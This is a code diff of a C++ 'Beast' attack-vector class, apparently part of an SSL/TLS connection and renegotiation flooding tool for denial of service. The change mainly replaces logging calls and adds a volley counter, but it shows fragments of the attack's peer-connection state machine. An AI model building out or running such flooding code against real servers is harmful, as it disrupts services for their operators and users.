@@ -6,13 +6,13 @@
 #include <openssl/ssl.h>
 
 #include "../Headers/Beast.hpp"
+#include "../Headers/Logging.hpp"
 
 Beast::Beast(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)) {
 
 }
 
-void Beast::attack(const int *id) {
-    std::string message{};
+void Beast::attack() {
     init();
     fd_set rfds;
     fd_set wfds;
@@ -35,15 +35,15 @@ void Beast::attack(const int *id) {
             }
         }
         if(n < 0){
-            conf->logger->Log("Select()", Logger::Error);
+            print_error("Select()");
             exit(EXIT_FAILURE);
         }
         int end = opt.n_peers;
         for(int i = 0; i < end; i++){
             if((peers[i].state == TCP_CONNECTING) && (peers[i].tv_connect_sec + TO_TCP_CONNECT < tv.tv_sec)){
-                message = "Connection timed out: ";
-                message += std::to_string(i);
-                conf->logger->Log(&message, Logger::Warning);
+                char message[512];
+                snprintf(message, sizeof(message), "Connection timed out: %d", i);
+                print_warning(message);
                 PEER_disconnect(&peers[i]);
                 continue;
             }
@@ -59,8 +59,7 @@ void Beast::attack(const int *id) {
                 continue;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 
@@ -99,7 +98,7 @@ void Beast::SSL_set_rw(_peer *p, int ret) {
             break;
         default:
             if(opt.stat.total_ssl_connect <= 0){
-                conf->logger->Log("Ssl error", Logger::Error);
+                print_error("SSL error");
                 exit(EXIT_FAILURE);
             }
             opt.stat.error_count++;
@@ -133,7 +132,7 @@ int Beast::ssl_handshake_io(_peer *p) {
     int err = SSL_get_error(p->ssl, ret);
     if((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE)){
         if(opt.stat.total_renegotiations <= 0){
-            conf->logger->Log("Renegotiations error", Logger::Error);
+            print_error("Renegotiations error");
             exit(EXIT_FAILURE);
         }
     }
@@ -191,7 +190,7 @@ void Beast::PEER_SSL_connect(_peer *p) {
 
 void Beast::PEER_connect(_peer *p) {
     if (tcp_connect(p) != 0){
-        conf->logger->Log("Tcp_connect()", Logger::Error);
+        print_error("Tcp_connect()");
         exit(EXIT_FAILURE);
     }
 }
@@ -232,7 +231,7 @@ int Beast::tcp_connect_try_finish(_peer *p, int ret) {
     if(ret != 0){
         if((errno != EINPROGRESS) && (errno != EAGAIN)){
             if(opt.stat.total_tcp_connections <= 0){
-                conf->logger->Log("Tcp connect", Logger::Error);
+                print_error("Tcp connect");
                 exit(EXIT_FAILURE);
             }
             return -1;
@@ -298,7 +297,7 @@ void Beast::CompleteState(_peer *p) {
             }else{
                 if(opt.n_peers < opt.n_max_peers){
                     if(peers[opt.n_peers].state != UNKNOWN){
-                        conf->logger->Log("Tnternal error", Logger::Error);
+                        print_error("Tnternal error");
                         exit(EXIT_FAILURE);
                     }
                     PEER_disconnect(&peers[opt.n_peers]);
@@ -309,7 +308,7 @@ void Beast::CompleteState(_peer *p) {
         case SSL_CONNECTING:
             ret = ssl_connect_io(p);
             if(ret != 0){
-                conf->logger->Log("Ssl_connect_io()", Logger::Error);
+                print_error("SSL_connect_io()");
                 exit(EXIT_FAILURE);
             }
             break;
@@ -328,7 +327,7 @@ void Beast::CompleteState(_peer *p) {
             }
             break;
         default:
-            conf->logger->Log("Unknown state", Logger::Error);
+            print_error("Unknown state");
             exit(EXIT_FAILURE);
     }
 }
